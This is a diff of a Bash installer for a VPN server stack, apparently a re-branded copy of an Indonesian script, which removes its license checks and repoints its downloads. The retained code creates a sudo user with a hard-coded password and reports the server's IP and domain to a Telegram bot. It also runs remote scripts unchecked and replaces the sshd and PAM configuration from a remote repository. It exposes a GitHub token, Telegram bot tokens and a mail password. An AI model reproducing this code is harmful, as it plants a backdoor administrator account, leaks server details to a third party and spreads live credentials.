@@ -1,5 +1,4 @@
 #!/bin/bash
-### Color
 Green="\e[92;1m"
 RED="\033[31m"
 YELLOW="\033[33m"
@@ -15,7 +14,6 @@ red='\e[1;31m'
 green='\e[0;32m'
 tyblue='\e[1;36m'
 NC='\e[0m'
-# sc ridwan tes decrypt
 purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
 tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
 yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
@@ -26,7 +24,6 @@ apt update -y
 apt upgrade -y 
 apt install lolcat -y  
 gem install lolcat
-#=================
 function LOGO() {
    echo -e "
     ┌───────────────────────────────────────────────┐
@@ -41,47 +38,21 @@ ${RED}Make sure the internet is smooth when installing the script${FONT}
         "
 }
 clear
-  # // Exporint IP AddressInformation
 export IP=$( curl -sS ipinfo.io/ip )
-
-# // Clear Data
 clear
 clear && clear && clear
 clear;clear;clear
-
-  # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Welcome To Kyt Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
+echo -e "  Welcome To Jembut Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Auther : ${green}MYRIDWAN ${NC}${YELLOW}(${NC} ${green}Geo Project ${NC}${YELLOW})${NC}"
-echo -e "       © Recode By Geo Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
+echo -e "         Auther : ${green}MYRIDWAN ${NC}${YELLOW}(${NC} ${green}Yaddy Kakkoii ${NC}${YELLOW})${NC}"
+echo -e "       © Recode By Yaddy Kakkoii ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 5
-###### IZIN SC DAN TRIAL SC
 ipsaya=$(wget -qO- ipinfo.io/ip)
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip"
-function CEKIPX() {
-MYIP=$(curl -sS ipv4.icanhazip.com)
-IPVPS=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip | grep $MYIP | awk '{print $4}')
-if [[ $MYIP == $IPVPS ]]; then
-clear
-else
-  key2
-fi
-}
-  # // Banner
-#echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
-#echo -e "  Welcome To MyridTunnel Project Script Manager ${BLUE}(${NC}${BLUE} Last Update Edition ${NC}${BLUE})${NC}"
-#echo -e "     This Will Quick Setup VPN Server On Your Server"
-#echo -e "         Auther : ${BLUE}MYRID ${NC}${BLUE}(${NC} ${BLUE} MyridTunnel Project ${NC}${BLUE})${NC}"
-#echo -e "       © Recode By MyridTunnel Project ${BLUE}(${NC} 2023 ${BLUE})${NC}"
-#echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
-#echo ""
-#sleep 3
-##
 echo -e  "${REDBG}┌──────────────────────────────────────────┐${NC}"
 echo -e  "${REDBG}│              INPUT YOUR NAME             │${NC}"
 echo -e  "${REDBG}└──────────────────────────────────────────┘${NC}"
@@ -96,182 +67,51 @@ clear
 author=$(cat /etc/profil)
 echo ""
 echo ""
-
-function key2(){
 clear
-echo -e  "${REDBG}┌──────────────────────────────────────────┐${NC}"
-echo -e  "${REDBG}│              MASUKKAN LICENSE KEY        │${NC}"
-echo -e  "${REDBG}└──────────────────────────────────────────┘${NC}"
-echo " "
-read -rp "Masukan Key Kamu Disini (Ctrl + C Exit) : " -e kode
-
-if [ -z $kode ]; then
-echo -e "KODE SALAH SILAHKAN MASUKKAN ULANG KODENYA"
-key2
-fi
-
-LIST=$(curl -sS https://raw.githubusercontent.com/myridwan/license/ipuk/key | grep $kode | awk '{print $2}')
-Key=$(curl -sS https://raw.githubusercontent.com/myridwan/license/ipuk/key | grep $kode | awk '{print $3}')
-KEY2=$(curl -sS https://raw.githubusercontent.com/myridwan/license/ipuk/key | grep $kode | awk '{print $4}')
-ADMIN=$(curl -sS https://raw.githubusercontent.com/myridwan/license/ipuk/key | grep $kode | awk '{print $5}')
-TOTALIP=$(curl -sS https://raw.githubusercontent.com/myridwan/license/ipuk/key | grep $kode | awk '{print $6}')
-web=$(curl -sS https://abc.xcodehoster.com/izinx | grep $kode | awk '{print $3}')
-web2=$(curl -sS https://abc.xcodehoster.com/izinx | grep $kode | awk '{print $2}')
-web3=$(curl -sS https://abc.xcodehoster.com/izinx | grep $kode | awk '{print $4}')
-web4=$(curl -sS https://abc.xcodehoster.com/izinx | grep $kode | awk '{print $5}')
-web5=$(curl -sS https://abc.xcodehoster.com/izinx | grep $kode | awk '{print $6}')
-
-if [[ $kode == $web ]]; then
-MYIP=$(curl -sS ipv4.icanhazip.com)
-rm -rf /etc/github
-mkdir /etc/github
-echo "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" > /etc/github/api
-echo "alnurridwan112@gmail.com" > /etc/github/email
-echo "myridwan" > /etc/github/username
-clear
-APIGIT=$(cat /etc/github/api)
-EMAILGIT=$(cat /etc/github/email)
-USERGIT=$(cat /etc/github/username)
-hhari=$(date -d "$web3 days" +"%Y-%m-%d")
-mkdir /root/myridwan
-cd /root/myridwan
-wget https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip >/dev/null 2>&1
-if [ "$web4" = "ON" ]; then
-sed -i "/# RESELLER/a ### ${author} ${hhari} ${MYIP} ${web4} ${web5}" /root/myridwan/ip
-else
-echo "### $author $hhari $MYIP $web2" >> ip
-
-fi
-sleep 0.5
-rm -rf .git
-git config --global user.email "${EMAILGIT}" >/dev/null 2>&1
-git config --global user.name "${USERGIT}" >/dev/null 2>&1
-git init >/dev/null 2>&1
-git add ip
-git commit -m register >/dev/null 2>&1
-git branch -M ipuk >/dev/null 2>&1
-git remote add origin https://github.com/${USERGIT}/izinvps >/dev/null 2>&1
-git push -f https://${APIGIT}@github.com/${USERGIT}/izinvps >/dev/null 2>&1
-rm -rf /root/myridwan
-rm -rf /etc/github
-clear
-
-elif [[ $kode == $Key ]]; then
-MYIP=$(curl -sS ipv4.icanhazip.com)
-rm -rf /etc/github
-mkdir /etc/github
-echo "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" > /etc/github/api
-echo "alnurridwan112@gmail.com" > /etc/github/email
-echo "myridwan" > /etc/github/username
-clear
-APIGIT=$(cat /etc/github/api)
-EMAILGIT=$(cat /etc/github/email)
-USERGIT=$(cat /etc/github/username)
-hhari=$(date -d "$KEY2 days" +"%Y-%m-%d")
-mkdir /root/myridwan
-cd /root/myridwan
-wget https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip >/dev/null 2>&1
-if [ "$ADMIN" = "ON" ]; then
-sed -i "/# RESELLER/a ### ${author} ${hhari} ${MYIP} ${ADMIN} ${TOTALIP}" /root/myridwan/ip
-else
-echo "### $author $hhari $MYIP $LIST" >> ip
-fi
-sleep 0.5
-rm -rf .git
-git config --global user.email "${EMAILGIT}" >/dev/null 2>&1
-git config --global user.name "${USERGIT}" >/dev/null 2>&1
-git init >/dev/null 2>&1
-git add ip
-git commit -m register >/dev/null 2>&1
-git branch -M ipuk >/dev/null 2>&1
-git remote add origin https://github.com/${USERGIT}/izinvps >/dev/null 2>&1
-git push -f https://${APIGIT}@github.com/${USERGIT}/izinvps >/dev/null 2>&1
-sleep 0.5
-rm ip
-wget https://raw.githubusercontent.com/myridwan/license/ipuk/key >/dev/null 2>&1
-if [ "$ADMIN" = "ON" ]; then
-sed -i "/^### $LIST $Key $KEY2 $ADMIN $TOTALIP/d" /root/myridwan/key
-else
-sed -i "/^### $LIST $Key $KEY2/d" /root/myridwan/key
-fi
-sleep 0.5
-rm -rf .git
-git config --global user.email "alnurridwan112@gmail.com" >/dev/null 2>&1
-git config --global user.name "myridwan" >/dev/null 2>&1
-git init >/dev/null 2>&1
-git add key
-git commit -m register >/dev/null 2>&1
-git branch -M ipuk >/dev/null 2>&1
-git remote add origin https://github.com/myridwan/license >/dev/null 2>&1
-git push -f https://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@github.com/myridwan/license >/dev/null 2>&1
-rm -rf /root/myridwan
-rm -rf /etc/github
-clear
-else
-echo -e "KODE SALAH SILAHKAN MASUKKAN ULANG KODENYA"
-sleep 1
-key2
-fi
-}
-##IZIN IP DAN TRIAL SC 
-# // Checking Os Architecture
 LOGO
-if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
-    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
-else
-    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
-    exit 1
-fi
-
+    if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
+        echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
+    else
+        echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
+        exit 1
+    fi
 # // Checking System
-if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
-    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
-    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-else
-    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-    exit 1
-fi
-
-# // IP Address Validating
-if [[ $IP == "" ]]; then
-    echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
-else
-    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
-fi
-
-# // Validate Successfull
+    if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
+        echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
+    elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
+        echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
+    else
+        echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
+        exit 1
+    fi
+    if [[ $IP == "" ]]; then
+        echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
+    else
+        echo -e "${OK} IP Address ( ${green}$IP${NC} )"
+    fi
 echo ""
 read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
 echo ""
 clear
-if [ "${EUID}" -ne 0 ]; then
+    if [ "${EUID}" -ne 0 ]; then
 		echo "You need to run this script as root"
 		exit 1
-fi
-if [ "$(systemd-detect-virt)" == "openvz" ]; then
+    fi
+    if [ "$(systemd-detect-virt)" == "openvz" ]; then
 		echo "OpenVZ is not supported"
 		exit 1
-fi
+    fi
 red='\e[1;31m'
 green='\e[0;32m'
 NC='\e[0m'
 #IZIN SCRIPT
 MYIP=$(curl -sS ipv4.icanhazip.com)
-echo -e "\e[32mloading...\e[0m"
-clear
-#IZIN SCRIPT
-MYIP=$(curl -sS ipv4.icanhazip.com)
 echo -e "\e[32mloading...\e[0m" 
 clear
-# Version sc
-clear
-#########################
-# USERNAME
 rm -f /usr/bin/user
-username=$(curl https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip | grep $MYIP | awk '{print $2}')
+username=$(cat /etc/profil)
 echo "$username" >/usr/bin/user
-expx=$(curl https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip | grep $MYIP | awk '{print $3}')
+expx="Lifetime"
 echo "$expx" >/usr/bin/e
 # DETAIL ORDER
 username=$(cat /usr/bin/user)
@@ -291,22 +131,16 @@ datediff() {
 }
 mai="datediff "$Exp" "$DATE""
 
-# Status ExpiRED Active | Geo Project
+# Status ExpiRED Active | Yaddy Kakkoii
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl https://raw.githubusercontent.com/myridwan/izinvps/ipuk/ip | grep $MYIP | awk '{print $4}')
-if [[ $today < $Exp1 ]]; then
 sts="${Info}"
-else
-sts="${Error}"
-fi
 echo -e "\e[32mloading...\e[0m"
 clear
-# REPO    
-    REPO="https://abc.xcodehoster.com/"
-
-####
+# REPO
+    REPO="https://raw.githubusercontent.com/YaddyKakkoii/ft/main/"
+####REPPO="https://abc.xcodehoster.com/"
 start=$(date +%s)
 secs_to_human() {
     echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
@@ -348,7 +182,6 @@ function is_root() {
 # Buat direktori xray
 print_install "Membuat direktori xray"
     mkdir -p /etc/xray
-    
     curl -s ipinfo.io/city >> /etc/xray/city
     curl -s ifconfig.me > /etc/xray/ipvps
     curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp
@@ -384,27 +217,25 @@ function first_setup(){
     echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
     print_success "Directory Xray"
     if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
-    echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
-    sudo apt update -y
-    apt-get install --no-install-recommends software-properties-common
-    add-apt-repository ppa:vbernat/haproxy-2.0 -y
-    apt-get -y install haproxy=2.0.\*
-elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
-    echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
-    curl https://haproxy.debian.net/bernat.debian.org.gpg |
+        echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+        sudo apt update -y
+        apt-get install --no-install-recommends software-properties-common
+        add-apt-repository ppa:vbernat/haproxy-2.0 -y
+        apt-get -y install haproxy=2.0.\*
+    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
+        echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+        curl https://haproxy.debian.net/bernat.debian.org.gpg |
         gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
-    echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
+        echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
         http://haproxy.debian.net buster-backports-1.8 main \
         >/etc/apt/sources.list.d/haproxy.list
-    sudo apt-get update
-    apt-get -y install haproxy=1.8.\*
-else
-    echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
-    exit 1
-fi
+        sudo apt-get update
+        apt-get -y install haproxy=1.8.\*
+    else
+        echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
+        exit 1
+    fi
 }
-
-# GEO PROJECT
 clear
 function nginx_install() {
     # // Checking System
@@ -484,7 +315,7 @@ resbot() {
 apt update && apt upgrade
 apt install python3 python3-pip git
 cd /usr/bin
-wget https://abc.xcodehoster.com/bot/adminbot.zip
+wget ${REPO}adminbot.zip
 unzip adminbot.zip
 chmod +x /usr/bin/*
 clear
@@ -492,7 +323,7 @@ pip3 install -r adminbot/requirements.txt
 }
 #DOMAIN
 res1() {
-wget https://abc.xcodehoster.com/ssh/cf.sh && chmod +x cf.sh
+wget ${REPO}cf.sh && chmod +x cf.sh
 clear
 }
 #MENU
@@ -506,10 +337,10 @@ wget https://abc.xcodehoster.com/menu/menu2.zip
 }
 #MODULE XRAY
 res3() {
-REPO="https://abc.xcodehoster.com/"
-wget -O /etc/xray/config.json "${REPO}xray/config.json" >/dev/null 2>&1
+REPO="https://raw.githubusercontent.com/YaddyKakkoii/ft/main/"
+wget -O /etc/xray/config.json "${REPO}config.json"
 #wget -O /usr/local/bin/xray "${REPO}xray/xray.linux.64bit" >/dev/null 2>&1
-wget -O /etc/systemd/system/runn.service "${REPO}xray/runn.service" >/dev/null 2>&1
+wget -O /etc/systemd/system/runn.service "${REPO}runn.service"
 #chmod +x /usr/local/bin/xray
 domain=$(cat /etc/xray/domain)
 IPVS=$(cat /etc/xray/ipvps)
@@ -523,30 +354,30 @@ print_success "Core Xray 1.8.1 Latest Version"
     wget -O /etc/nginx/conf.d/xray.conf "${REPO}xray/xray.conf" >/dev/null 2>&1
     sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
     sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
-    curl ${REPO}ssh/nginx.conf > /etc/nginx/nginx.conf
+    curl ${REPO}nginx.conf > /etc/nginx/nginx.conf
 }
 #PASSWORDSSH
 res4() {
-wget -O /etc/pam.d/common-password "${REPO}ssh/password"
+wget -O /etc/pam.d/common-password "${REPO}password"
 chmod +x /etc/pam.d/common-password
 }
 #LIMIT QUOTA
 res5() {
-wget -q -O /usr/local/sbin/quota "${REPO}limit/quota"
+wget -q -O /usr/local/sbin/quota "${REPO}quota"
 chmod +x /usr/local/sbin/quota
 chmod + x /usr/local/sbin/quota
 cd /usr/local/sbin/
 sed -i 's/\r//' quota
-cd
+cd /root
 }
 #Badvpn 7100-7300
 res6() {
 mkdir -p /usr/local/kyt/
-wget -q -O /usr/local/kyt/udp-mini "${REPO}badvpn/udp-mini"
+wget -q -O /usr/local/kyt/udp-mini "${REPO}udp-mini"
 chmod +x /usr/local/kyt/udp-mini
-wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}badvpn/udp-mini-1.service"
-wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}badvpn/udp-mini-2.service"
-wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}badvpn/udp-mini-3.service"
+wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}udp-mini-1.service"
+wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}udp-mini-2.service"
+wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}udp-mini-3.service"
 systemctl disable udp-mini-1
 systemctl stop udp-mini-1
 systemctl enable udp-mini-1
@@ -562,13 +393,13 @@ systemctl start udp-mini-3
 }
 #SLOWDNS
 res7() {
-wget -q -O /tmp/nameserver "${REPO}slowdns/nameserver" >/dev/null 2>&1
+wget -q -O /tmp/nameserver "${REPO}nameserver"
     chmod +x /tmp/nameserver
     bash /tmp/nameserver | tee /root/install.log
 }
 #SSHD
 res8() {
-wget -q -O /etc/ssh/sshd_config "${REPO}ws/sshd" >/dev/null 2>&1
+wget -q -O /etc/ssh/sshd_config "${REPO}sshd"
 chmod 700 /etc/ssh/sshd_config
 /etc/init.d/ssh restart
 systemctl restart ssh
@@ -576,14 +407,14 @@ systemctl restart ssh
 }
 #DROPBEAR
 res9() {
-wget -q -O /etc/default/dropbear "${REPO}ssh/dropbear.conf"
+wget -q -O /etc/default/dropbear "${REPO}dropbear.conf"
 chmod +x /etc/default/dropbear
 /etc/init.d/dropbear restart
 /etc/init.d/dropbear status
 }
 #OPENVPB
 res10() {
-wget ${REPO}ssh/openvpn &&  chmod +x openvpn && ./openvpn
+wget ${REPO}openvpn &&  chmod +x openvpn && ./openvpn
 /etc/init.d/openvpn restart
 }
 #BQCKUP
@@ -594,11 +425,12 @@ wget ${REPO}bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
 }
 #WSEPRO
 res14() {
-wget -O /usr/bin/ws "https://abc.xcodehoster.com/ws/ws" >/dev/null 2>&1
-    wget -O /usr/bin/sysctl.conf "https://abc.xcodehoster.com/ws/sysctl.conf" >/dev/null 2>&1
-    wget -O /usr/bin/tun.conf "https://abc.xcodehoster.com/ws/tun.conf" >/dev/null 2>&1
-    wget -O /etc/systemd/system/ws.service "https://abc.xcodehoster.com/ws/ws.service" >/dev/null 2>&1
-    
+wget -O /usr/bin/ws "${REPO}ws" >/dev/null 2>&1
+#    wget -O /usr/bin/sysctl.conf "https://abc.xcodehoster.com/ws/sysctl.conf" >/dev/null 2>&1
+#touch /usr/bin/sysctl.conf
+wget -O /usr/bin/sysctl.conf "${REPO}sysctl.conf"
+    wget -O /usr/bin/tun.conf "${REPO}tun.conf"
+    wget -O /etc/systemd/system/ws.service "${REPO}ws.service"
     chmod +x /etc/systemd/system/ws.service
     chmod +x /usr/bin/ws
     chmod 644 /usr/bin/sysctl.conf
@@ -610,64 +442,22 @@ systemctl start ws
 systemctl restart ws
 }
 res15() {
-wget https://abc.xcodehoster.com/ssh/udp
+wget ${REPO}udp
 chmod +x udp
 ./udp
 }
 # Fungsi input domain
 #
 base_package
-REPO="https://abc.xcodehoster.com/"
-echo -e ""
-clear
-apt install jq curl -y
-echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
-echo -e "${tyblue}│ \033[1;37mPlease select a your Choice to Set Domain${tyblue}│${NC}"
-echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
-echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
-echo -e "${tyblue}│  [ 1 ]  \033[1;37mGunakan Domain Sendiri/Domainmu       ${NC}"
-echo -e "${tyblue}│  "                                        
-echo -e "${tyblue}│  [ 2 ]  \033[1;37mGunakan Domain Dari Scriptnya      ${NC}"
-echo -e "${tyblue}│     "                                     
-echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
-read -p "   Please select numbers 1-2 or Any Button(Random) : " host
-echo ""
-if [[ $host == "1" ]]; then
-echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
-read -p "   Subdomain: " host1
-echo "IP=" >> /var/lib/kyt/ipvps.conf
-echo $host1 > /etc/xray/domain
-echo $host1 > /root/domain
-echo -e  "${tyblue}┌──────────────────────────────────────────┐${NC}"
-echo -e  "${tyblue}│              \033[1;37mTERIMA KASIH                ${tyblue}│${NC}"
-echo -e  "${tyblue}│         \033[1;37mSUDAH MENGGUNAKAN SCRIPT         ${tyblue}│${NC}"
-echo -e  "${tyblue}│                \033[1;37mDARI SAYA                 ${tyblue}│${NC}"
-echo -e  "${tyblue}└──────────────────────────────────────────┘${NC}"
-echo ""
-elif [[ $host == "2" ]]; then
-#install cf
-fun_bar 'res1'
-./cf.sh
-echo -e  "${tyblue}┌──────────────────────────────────────────┐${NC}"
-echo -e  "${tyblue}│              \033[1;37mTERIMA KASIH                ${tyblue}│${NC}"
-echo -e  "${tyblue}│         \033[1;37mSUDAH MENGGUNAKAN SCRIPT         ${tyblue}│${NC}"
-echo -e  "${tyblue}│                \033[1;37mDARI SAYA                 ${tyblue}│${NC}"
-echo -e  "${tyblue}└──────────────────────────────────────────┘${NC}"
-echo " "
-rm -f /root/cf.sh
-clear
-else
-print_install "Random Subdomain/Domain is Used"
+
 wget ${REPO}cf.sh && chmod +x cf.sh && ./cf.sh
-rm -f /root/cf.sh
-clear
-    fi
+
 #pasang ssl
 clear
 print_install "Memasang SSL Pada Domain"
     rm -rf /etc/xray/xray.key
     rm -rf /etc/xray/xray.crt
-    domain=$(cat /root/domain)
+    domain=$(cat /etc/xray/domain)
     STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
     rm -rf /root/.acme.sh
     mkdir /root/.acme.sh
@@ -688,16 +478,16 @@ function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
+    Username="memekpink"
+    Password=wangy
     mkdir -p /home/script/
     chmod 777 /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="1210833546"
-    KEY="6006599143:AAEgstCAioq35JgX97HaW_G3TAkLKzLZS_w"
+    CHATID="1117211252"
+    KEY="6654578153:AAEL08DFbdrgtirDqtBU6DkP_acq31uZPik"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="Succes At Registry
@@ -710,7 +500,7 @@ function password_default() {
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ◇━━━━━━━━━━━━━━━━━━━━━━━◇
-    ⚠︎By MyridTunnel Project Manager Community⚠︎
+    By MyridTunnel Project Manager Community
     ◇━━━━━━━━━━━━━━━━━━━━━━━◇
 "
 
@@ -763,29 +553,21 @@ rm -rf /etc/vmess/.vmess.db
 #Instal Xray
 function install_xray() {
 clear
-    print_install "Core Xray 1.8.1 Latest Version"
-    # install xray
+print_install "Core Xray 1.8.1 Latest Version"
     #echo -e "[ ${green}INFO$NC ] Downloading & Installing xray core"
-    domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
-    chown www-data.www-data $domainSock_dir
+domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
+chown www-data.www-data $domainSock_dir
     
-    # / / Ambil Xray Core Version Terbaru
 latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
 bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
- 
-    # // Ambil Config Server
-    fun_bar 'res3'
     
-    # Settings UP Nginix Server
+fun_bar 'res3'
     
 cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
 
-    # > Set Permission
-    chmod +x /etc/systemd/system/runn.service
-
-    # > Create Service
-    rm -rf /etc/systemd/system/xray.service.d
-    cat >/etc/systemd/system/xray.service <<EOF
+chmod +x /etc/systemd/system/runn.service
+rm -rf /etc/systemd/system/xray.service.d
+cat >/etc/systemd/system/xray.service <<EOF
 Description=Xray Service
 Documentation=https://github.com
 After=network.target nss-lookup.target
@@ -1007,13 +789,13 @@ print_install "Memasang Backup Server"
 #BackupOption
 apt install rclone -y
 printf "q\n" | rclone config
-wget -O /root/.config/rclone/rclone.conf "${REPO}backup/rclone.conf"
+wget -O /root/.config/rclone/rclone.conf "${REPO}rclone.conf"
 #Install Wondershaper
 cd /bin
 git clone  https://github.com/magnific0/wondershaper.git
 cd wondershaper
 sudo make install
-cd
+cd /root
 rm -rf wondershaper
 echo > /home/limit
 apt install msmtp-mta ca-certificates bsd-mailx -y
@@ -1033,7 +815,7 @@ password ynezhkhchxawicfo
 logfile ~/.msmtp.log
 EOF
 chown -R www-data:www-data /etc/msmtprc
-wget -q -O /etc/ipserver "${REPO}ssh/ipserver" && bash /etc/ipserver
+wget -q -O /etc/ipserver "${REPO}ipserver" && bash /etc/ipserver
 print_success "Backup Server"
 
 
@@ -1061,7 +843,7 @@ clear
     chronyc tracking -v
     
     fun_bar 'res13'
-print_success "Swap 1 G"
+print_success "Swap 10 GB"
 }
 
 function ins_Fail2ban(){
@@ -1075,7 +857,9 @@ apt -y install fail2ban > /dev/null 2>&1
 # Instal DDOS Flate
 if [ -d '/usr/local/ddos' ]; then
 	echo; echo; echo "Please un-install the previous version first"
-	exit 0
+	#exit 0
+	sleep 5
+	clear
 else
 	mkdir /usr/local/ddos
 fi
@@ -1086,7 +870,7 @@ echo "Banner /etc/kyt.txt" >>/etc/ssh/sshd_config
 sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/kyt.txt"@g' /etc/default/dropbear
 
 # Ganti Banner
-wget -O /etc/kyt.txt "${REPO}ssh/issue.net"
+wget -O /etc/kyt.txt "https://raw.githubusercontent.com/YaddyKakkoii/sclifetime/main/issue.net"
 print_success "Fail2ban"
 }
 
@@ -1284,7 +1068,6 @@ clear
     first_setup
     nginx_install
     make_folder_xray
-    CEKIPX
     #pasang_domain
     password_default
     install_bot
